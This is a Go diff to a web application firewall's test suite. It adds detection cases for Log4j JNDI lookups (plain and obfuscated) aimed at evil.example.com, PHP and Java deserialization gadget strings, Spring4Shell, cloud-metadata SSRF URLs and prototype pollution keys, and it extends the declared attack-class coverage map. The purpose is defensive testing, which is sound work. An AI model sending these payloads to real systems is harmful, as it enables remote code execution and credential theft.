@@ -359,6 +359,84 @@ var evasions = []evasion{
 		body: gqlBody(`{...A} fragment A on Q{...B} fragment B on Q{...A}`)},
 	{name: "graphql/depth over GET", technique: "urlencode",
 		target: "/graphql?query=" + urlEncodeQ(depthBomb(200))},
+
+	// ---- Log4j lookup injection (CVE-2021-44228) ---------------------------
+	//
+	// The payload travels in whatever field is eventually logged, so the header
+	// placements are the realistic ones rather than an afterthought. The
+	// obfuscated forms matter more than the plain one: every scanner in the wild
+	// nests lookups, and no substring of "jndi" survives "${${lower:j}ndi:".
+	{name: "jndi/plain ldap", technique: "none", arg: "${jndi:ldap://evil.example.com/a}"},
+	{name: "jndi/rmi", technique: "none", arg: "${jndi:rmi://evil.example.com/a}"},
+	{name: "jndi/dns exfil", technique: "none", arg: "${jndi:dns://evil.example.com/a}"},
+	{name: "jndi/lower obfuscation", technique: "nested-lookup",
+		arg: "${${lower:j}ndi:${lower:l}dap://evil.example.com/a}"},
+	{name: "jndi/empty-default obfuscation", technique: "nested-lookup",
+		arg: "${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example.com/a}"},
+	{name: "jndi/upper obfuscation", technique: "nested-lookup",
+		arg: "${${upper:j}ndi:ldap://evil.example.com/a}"},
+	{name: "jndi/in user agent", technique: "header",
+		header: [2]string{"User-Agent", "${jndi:ldap://evil.example.com/a}"}},
+	{name: "jndi/in referer", technique: "header",
+		header: [2]string{"Referer", "${jndi:ldap://evil.example.com/a}"}},
+	{name: "jndi/in json body", technique: "body",
+		body: `{"username":"${jndi:ldap://evil.example.com/a}"}`},
+
+	// ---- PHP object injection ----------------------------------------------
+	//
+	// The gadget chains are library-provided, so the payload is ordinary
+	// serialized data and the class names vary by target. Matching the header
+	// grammar is what makes these one rule rather than a list that ages.
+	{name: "phpobj/object header", technique: "none",
+		arg: `O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}`},
+	{name: "phpobj/array header", technique: "none",
+		arg: `a:2:{i:0;s:6:"system";i:1;s:2:"id";}`},
+	{name: "phpobj/laravel gadget", technique: "none",
+		arg: `O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:5:"event";s:7:"phpinfo";}`},
+	{name: "phpobj/monolog gadget", technique: "none",
+		arg: `O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"formatter";N;}`},
+	{name: "phpobj/nested in json", technique: "body",
+		body: `{"session":"O:8:\"stdClass\":1:{s:4:\"x\";s:2:\"hi\";}"}`},
+	{name: "phpobj/urlencoded", technique: "urlencode",
+		target: `/f?s=O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3B%7D`},
+
+	// ---- Java deserialization ----------------------------------------------
+	{name: "javaser/base64 stream", technique: "none",
+		arg: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ"},
+	{name: "javaser/base64 in json", technique: "body",
+		body: `{"state":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"}`},
+	{name: "javaser/raw magic", technique: "none", arg: "\xac\xed\x00\x05sr\x00\x11java.util.HashMap"},
+	{name: "javaser/spring4shell", technique: "none",
+		target: "/u?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"},
+
+	// ---- Server-side request forgery ---------------------------------------
+	//
+	// Lexical only, by design: gwaf never resolves a hostname, so these are the
+	// literal targets and the protocol-smuggling schemes. DNS rebinding is out
+	// of reach of any per-request check and is not claimed.
+	{name: "ssrf/aws imds", technique: "none",
+		arg: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+	{name: "ssrf/gcp metadata", technique: "none",
+		arg: "http://metadata.google.internal/computeMetadata/v1/"},
+	{name: "ssrf/ecs task metadata", technique: "none", arg: "http://169.254.170.2/v2/credentials/"},
+	{name: "ssrf/alibaba metadata", technique: "none", arg: "http://100.100.100.200/latest/meta-data/"},
+	{name: "ssrf/gopher redis", technique: "none", arg: "gopher://10.0.0.5:6379/_SET%20x%20y"},
+	{name: "ssrf/dict memcached", technique: "none", arg: "dict://10.0.0.5:11211/stats"},
+	{name: "ssrf/imds urlencoded", technique: "urlencode",
+		target: "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"},
+
+	// ---- Prototype pollution -----------------------------------------------
+	//
+	// A key, not a value. "__proto__" written in a sentence is a word; written
+	// as an object key it reassigns Object.prototype for the whole process.
+	{name: "protopoll/proto key in json", technique: "body",
+		body: `{"__proto__":{"isAdmin":true}}`},
+	{name: "protopoll/nested proto key", technique: "body",
+		body: `{"user":{"__proto__":{"role":"admin"}}}`},
+	{name: "protopoll/constructor path", technique: "none",
+		target: "/settings?constructor.prototype.isAdmin=true"},
+	{name: "protopoll/bracket form", technique: "none",
+		target: "/settings?constructor][prototype][isAdmin=true"},
 }
 
 // urlEncodeQ percent-encodes a GraphQL document for the GET form the
@@ -668,6 +746,14 @@ func TestSniffingDoesNotBreakFormBodies(t *testing.T) {
 // So a class named here with too few cases fails the build. The failure is the
 // point: it is the difference between a gap that is visible in CI and a gap
 // that has to be found by probing the firewall by hand.
+// The five classes below the first block were added after an attack simulation
+// walked them straight through a ruleset that reported 139/139. That is the
+// same failure this list was created to prevent, one level up: the corpus could
+// not see a missing class because the *class list itself* was the thing with
+// the hole. A class absent from both is invisible twice over.
+//
+// So the rule for adding coverage is: name the class here first, watch the
+// build fail for want of cases, then write them.
 var declaredClasses = map[string]int{
 	"sqli":      8,
 	"xss":       8,
@@ -681,6 +767,11 @@ var declaredClasses = map[string]int{
 	"ldapi":     8,
 	"grpc":      4,
 	"graphql":   6,
+	"jndi":      6,
+	"phpobj":    5,
+	"javaser":   3,
+	"ssrf":      6,
+	"protopoll": 3,
 }
 
 // classOf returns the attack class a case belongs to, taken from its name.
